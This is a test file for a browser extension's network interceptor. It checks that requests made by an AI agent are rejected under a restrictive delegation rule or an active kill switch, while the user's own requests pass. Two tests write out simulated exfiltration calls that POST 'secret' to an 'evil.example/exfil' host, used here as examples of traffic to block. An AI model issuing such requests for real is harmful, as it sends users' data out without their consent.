/**
 * @vitest-environment jsdom
 *
 * End-to-end network deny test for #29 enforcement item 5.
 *
 * The MAIN-world interceptor wires `decideNetwork` into the network interceptor.
 * Under a delegation that withholds the `network-request` capability (readOnly /
 * limited) — or while the kill switch is active — an AGENT-attributed fetch is
 * rejected and an agent-attributed XHR cannot be sent (its `open()` is skipped,
 * so native `send()` throws). The user's own page requests (no CDP stack
 * signature) always pass, so enforcement cannot break the page; and with no
 * delegation at all, agent requests pass through (normal automation unaffected).
 *
 * Agent attribution is simulated by issuing the request from inside a function
 * named `UtilityScript` — one of the stack patterns the interceptor matches.
 */
import { describe, it, expect, beforeAll, vi } from 'vitest';
import { MSG_BRIDGE_BOOTSTRAP, MSG_RULE_UPDATE, MSG_KILL_SWITCH } from './bridge-protocol';

interface TestRule {
  isActive: boolean;
  expiresAt: string | null;
  actionRestrictions: Array<{ capability: string; action: 'allow' | 'block' }>;
  sitePatterns: Array<{ pattern: string; action: 'allow' | 'block' }>;
}

let toInterceptor: MessagePort;

function asAgent<T>(fn: () => T): T {
  const UtilityScript = function UtilityScript(): T {
    return fn();
  };
  return UtilityScript();
}

function flush(): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, 0));
}

async function setRule(rule: TestRule | null): Promise<void> {
  toInterceptor.postMessage({ type: MSG_RULE_UPDATE, rule });
  await flush();
}

async function setKillSwitch(active: boolean): Promise<void> {
  toInterceptor.postMessage({ type: MSG_KILL_SWITCH, active });
  await flush();
}

/** readOnly-style rule: navigate + read-dom allowed, network-request withheld. */
function networkBlockedRule(): TestRule {
  return {
    isActive: true,
    expiresAt: null,
    actionRestrictions: [
      { capability: 'navigate', action: 'allow' },
      { capability: 'read-dom', action: 'allow' },
    ],
    sitePatterns: [],
  };
}

function networkAllowedRule(): TestRule {
  return {
    isActive: true,
    expiresAt: null,
    actionRestrictions: [{ capability: 'network-request', action: 'allow' }],
    sitePatterns: [],
  };
}

beforeAll(async () => {
  Object.defineProperty(globalThis, 'isSecureContext', { value: true, configurable: true });

  // Stub fetch BEFORE import so the interceptor wraps a resolved stub, not a real
  // network call. Allowed requests resolve to this; blocked ones never reach it.
  const fetchStub = vi.fn(() => Promise.resolve(new Response('ok')));
  (window as unknown as { fetch: typeof fetch }).fetch = fetchStub as unknown as typeof fetch;

  await import('./interceptor');

  const channel = new MessageChannel();
  toInterceptor = channel.port1;
  toInterceptor.start();
  window.dispatchEvent(
    new MessageEvent('message', {
      data: { type: MSG_BRIDGE_BOOTSTRAP },
      source: window,
      ports: [channel.port2],
    }),
  );
  await flush();
});

describe('network egress deny (fetch)', () => {
  it('rejects an agent fetch when the rule withholds network-request', async () => {
    await setRule(networkBlockedRule());
    await expect(
      asAgent(() => window.fetch('https://evil.example/exfil', { method: 'POST', body: 'secret' }))
    ).rejects.toThrow();
  });

  it('lets the user\'s own fetch through under the same rule', async () => {
    await setRule(networkBlockedRule());
    const res = await window.fetch('https://api.example.com/ok');
    expect(res).toBeTruthy();
  });

  it('lets an agent fetch through when the rule allows network-request', async () => {
    await setRule(networkAllowedRule());
    const res = await asAgent(() => window.fetch('https://api.example.com/ok'));
    expect(res).toBeTruthy();
  });

  it('lets an agent fetch through when there is no delegation (pass-through)', async () => {
    await setRule(null);
    const res = await asAgent(() => window.fetch('https://api.example.com/ok'));
    expect(res).toBeTruthy();
  });

  it('rejects every agent fetch while the kill switch is active, even with an allowing rule', async () => {
    await setRule(networkAllowedRule());
    await setKillSwitch(true);
    await expect(
      asAgent(() => window.fetch('https://api.example.com/ok'))
    ).rejects.toThrow();

    // The user's own fetch is still allowed during the kill switch.
    const res = await window.fetch('https://api.example.com/ok');
    expect(res).toBeTruthy();

    await setKillSwitch(false);
  });
});

describe('network egress deny (XHR)', () => {
  it('prevents an agent XHR from being sent (open skipped → send throws)', async () => {
    await setRule(networkBlockedRule());
    const xhr = new XMLHttpRequest();
    asAgent(() => { xhr.open('POST', 'https://evil.example/exfil'); });

    // open() was skipped, so the XHR is still UNSENT and send() throws.
    expect(xhr.readyState).toBe(0);
    expect(() => xhr.send('secret')).toThrow();
  });

  it('opens a user XHR normally under the same rule', async () => {
    await setRule(networkBlockedRule());
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.example.com/ok'); // non-agent frame
    expect(xhr.readyState).toBe(1); // OPENED — native open ran
    // Do not send (avoid a real request); open-state is the proof.
  });
});
